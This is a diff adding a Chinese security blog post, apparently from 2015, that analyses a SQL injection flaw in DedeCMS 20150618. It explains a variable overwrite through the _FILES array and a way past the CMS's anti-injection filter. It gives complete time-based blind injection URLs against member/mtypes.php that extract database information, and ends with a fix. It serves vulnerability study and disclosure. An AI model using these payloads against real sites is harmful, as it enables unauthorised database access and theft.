@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Dedecms 20150618 注入 | Manning23</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 漏洞信息http://www.wooyun.org/bugs/wooyun-2015-0127787 0x01 漏洞成因概述由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。 漏洞利用流程：  利用_FILE传递数组 绕过dedecms的sql注入检测机制 进行注入  0x02 漏洞细节完整进行注入的语句为：http://192.168.110.135//d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dedecms 20150618 注入">
+<meta property="og:url" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/index.html">
+<meta property="og:site_name" content="Manning23">
+<meta property="og:description" content="0x00 漏洞信息http://www.wooyun.org/bugs/wooyun-2015-0127787 0x01 漏洞成因概述由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。 漏洞利用流程：  利用_FILE传递数组 绕过dedecms的sql注入检测机制 进行注入  0x02 漏洞细节完整进行注入的语句为：http://192.168.110.135//d">
+<meta property="og:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/3.png">
+<meta property="og:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/4.png">
+<meta property="og:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/5.png">
+<meta property="og:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/2.png">
+<meta property="og:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/6.png">
+<meta property="og:updated_time" content="2017-05-25T07:27:21.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dedecms 20150618 注入">
+<meta name="twitter:description" content="0x00 漏洞信息http://www.wooyun.org/bugs/wooyun-2015-0127787 0x01 漏洞成因概述由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。 漏洞利用流程：  利用_FILE传递数组 绕过dedecms的sql注入检测机制 进行注入  0x02 漏洞细节完整进行注入的语句为：http://192.168.110.135//d">
+<meta name="twitter:image" content="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/3.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Manning23" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Manning23</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Dedecms-20150618-注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/08/14/Dedecms-20150618-注入/" class="article-date">
+  <time datetime="2015-08-14T07:24:57.000Z" itemprop="datePublished">2015-08-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Dedecms 20150618 注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0127787" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0127787</a></p>
+<h2 id="0x01-漏洞成因概述"><a href="#0x01-漏洞成因概述" class="headerlink" title="0x01 漏洞成因概述"></a>0x01 漏洞成因概述</h2><p>由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。</p>
+<p>漏洞利用流程：</p>
+<ul>
+<li>利用_FILE传递数组</li>
+<li>绕过dedecms的sql注入检测机制</li>
+<li>进行注入</li>
+</ul>
+<h2 id="0x02-漏洞细节"><a href="#0x02-漏洞细节" class="headerlink" title="0x02 漏洞细节"></a>0x02 漏洞细节</h2><h3 id="完整进行注入的语句为："><a href="#完整进行注入的语句为：" class="headerlink" title="完整进行注入的语句为："></a>完整进行注入的语句为：</h3><pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?
+dopost=save&amp;
+_FILES[mtypename][name]=.xxxx&amp;
+_FILES[mtypename][type]=xxxxx&amp;
+_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1 ),1,1)) like 54,5,0)),0)%23fuck]=1&amp;
+_FILES[mtypename][size]=.xxxx
+</code></pre><p>需要理解的四点：</p>
+<ol>
+<li>为什么用_FILE传数组</li>
+<li>为什么注入语句写在tmp_name后</li>
+<li>为什么注入语句中有`‘`.``.mtypeid</li>
+<li>如何绕过dede的防注入</li>
+</ol>
+<h3 id="变量传递过程"><a href="#变量传递过程" class="headerlink" title="变量传递过程"></a>变量传递过程</h3><p>mtypes.php文件是一个缺陷文件，只要通过把$mtypename构造成数组，并且在把数组的key定义为sql注入语句，那么便可逃逸全局GPC。</p>
+<pre><code>foreach ($mtypename as $id =&gt; $name)
+{
+    $name = HtmlReplace($name);
+    $query = &quot;UPDATE `#@__mtypes` SET mtypename=&apos;$name&apos; WHERE mtypeid=&apos;$id&apos; AND mid=&apos;$cfg_ml-&gt;M_ID&apos;&quot;;
+    $dsql-&gt;ExecuteNoneQuery($query);
+}
+</code></pre><p>该文件的最后部分为缺陷部分，$id 和 $name 都在查询语句中，但是全局过滤未对数组的key进行过滤，导致$id内可以带任何字符，接下来就是构造$id的事情了。</p>
+<p>由于dedecms是一个伪全局的cms，我们需要把$mtypename覆盖出来，那么为什么用_FILE传输组呢，整个cms在变量初始化的过程中，在uploadsafe.inc.php中，会预处理_FILE传入的值，但是这段代码有问题。</p>
+<pre><code>foreach($_FILES as $_key=&gt;$_value)
+{
+    foreach($keyarr as $k)
+    {
+        if(!isset($_FILES[$_key][$k]))
+        {
+            exit(&apos;Request Error!&apos;);
+        }
+    }
+if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )
+{
+    exit(&apos;Request var not allow for uploadsafe!&apos;);
+}
+$$_key = $_FILES[$_key][&apos;tmp_name&apos;];
+${$_key.&apos;_name&apos;} = $_FILES[$_key][&apos;name&apos;];
+${$_key.&apos;_type&apos;} = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);
+${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);
+</code></pre><p>可以在倒数第四行看到一处变量覆盖，取$_key作为key，$_FILES[$_key][‘tmp_name’]作为value。</p>
+<p>我们传入的内容</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/3.png" alt=""></p>
+<p>覆盖后的内容</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/4.png" alt=""></p>
+<p><strong>绕过dedecms防sql模块</strong></p>
+<p>dedecms防注入模块有个bug，只要在`‘`后面的语句，都不会过防sqli模块。</p>
+<p>为什么这么构造？首先，我们看下dedecms防注入模块的执行流程。</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/5.png" alt=""></p>
+<p>在流程图中，最关键的步骤是生产clean sql的部分，其代码如下。</p>
+<pre><code>while (TRUE)
+    {
+        $pos = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
+        if ($pos === FALSE)
+        {
+            break;
+        }
+        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+        while (TRUE)
+        {
+            $pos1 = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
+            $pos2 = strpos($db_string, &apos;\\&apos;, $pos + 1);
+            if ($pos1 === FALSE)
+            {
+                break;
+            }
+            elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
+            {
+                $pos = $pos1;
+                break;
+            }
+            $pos = $pos2 + 1;
+        }
+        $clean .= &apos;$s$&apos;;
+        $old_pos = $pos + 1;
+    }
+    $clean .= substr($db_string, $old_pos);
+    $clean = trim(strtolower(preg_replace(array(&apos;~\s+~s&apos; ), array(&apos; &apos;), $clean)));
+</code></pre><p>通过阅读以上代码可以发现，这段代码的主要逻辑是把两个单引号（’）中间的内容替换为$s$，其他语句拼接到clean sql中。pos为第一个单引号的位置，pos1为第二的单引号的位置，pos2为第一个消意号的位置，通过这三个位置，便可以确定单引号之间的内容。</p>
+<p>通过这个特性，绕过防注入模块的思路大致是这样：<strong>先构造一个无意义的单引号，再在注释后面构造一个单引号来闭合前面无意义的单引号。</strong></p>
+<p>翻看之前dedecms的注入发现，大致有如下几种绕过技巧。</p>
+<ul>
+<li>char(@`‘`)</li>
+<li>char(“‘“)</li>
+<li>@`‘`</li>
+</ul>
+<p>但是最新版本已经对如上方式进行了检测</p>
+<pre><code>if (strpos($clean, &apos;@&apos;) !== FALSE  OR strpos($clean,&apos;char(&apos;)!== FALSE OR strpos($clean,&apos;&quot;&apos;)!== FALSE OR strpos($clean,&apos;$s$$s$&apos;)!== FALSE)
+</code></pre><p>因此需要一种新型绕过方式，主要还是利用`‘`特性：</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/2.png" alt=""></p>
+<p>但是有个要求，hitsid必须是testf.v959_hits表的字段，同理，利用此特性，构造查询语句。</p>
+<p>构造盲注查询语句：</p>
+<pre><code>1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck
+</code></pre><p>此语句所查内容为：如果此mysql所含的数据库的个数的第一位为2（ascii码为50），则sleep 5秒。</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>只要登陆了用户中心，便可以进行时间盲注，查询数据库内容。</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/6.png" alt=""></p>
+<p>查mysql所含的数据库的个数</p>
+<p>个数的第一位为2</p>
+<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
+</code></pre><p>个数的第二位为3</p>
+<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))like 51,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
+</code></pre><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>该漏洞利用零散的dedecms的漏洞，对这些小问题加以组合，最终到达随意注射的程度，十分精彩。分析这个漏洞，收获是在漏洞分析时，要有全局的眼光，不要忽视之前出现的每一个问题。</p>
+<p>漏洞小结</p>
+<p>影响范围个人评价为“高”，危害性个人评价为“高”，dedecms在国内的使用范围非常广，此漏洞只要登录会员中心便可取数据。</p>
+<p>防护方案</p>
+<p>对数组传入的key和value均进行gpc过滤。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/" data-id="cj343mye400000ofyi0nsb7nl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          vBulletin 5.0.x - 5.1.x RCE
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/">WordPress 4.6版本远程代码执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/21/Struts2-S046命令执行漏洞/">Struts2 S046命令执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/">Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/05/05/ImageMagic初步分析/">ImageMagic初步分析</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/22/Java反序列化内容/">Java反序列化内容</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Manning23<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
